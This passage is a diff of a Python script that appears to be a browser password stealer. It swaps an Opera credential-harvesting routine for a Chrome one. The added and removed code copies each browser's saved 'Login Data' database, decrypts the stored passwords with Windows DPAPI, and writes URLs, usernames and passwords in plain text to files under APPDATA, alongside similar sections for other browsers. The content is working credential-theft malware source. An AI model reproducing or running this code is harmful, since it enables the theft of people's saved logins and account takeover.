@@ -42,24 +42,25 @@ file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+")
 file.write(all_data)
 file.close()
 ################################################################################
-#                              OPERA PASSWORDS                                 #
+#                              GOOGLE PASSWORDS                                #
 ################################################################################
-def Opera():
-   texto = 'Passwords Opera:' + '\n'
-   texto += 'URL | LOGIN | PASSWORD' + '\n'
-   if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
-       shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
-       conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
+def Chrome(): 
+   text = 'Passwords Chrome:' + '\n' 
+   text += 'URL | LOGIN | PASSWORD' + '\n' 
+   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'): 
+       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
+       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2') 
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
-           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
+           password = win32crypt.CryptUnprotectData(result[2])[1].decode() 
            login = result[1]
            url = result[0]
            if password != '':
-               texto += url + ' | ' + login + ' | ' + password + '\n'
-file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")
-file.write(str(Opera()) + '\n')
+               text += url + ' | ' + login + ' | ' + password + '\n' 
+   return text
+file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
+file.write(str(Chrome()) + '\n')
 file.close()
 ################################################################################
 #                              YANDEX PASSWORDS                                #
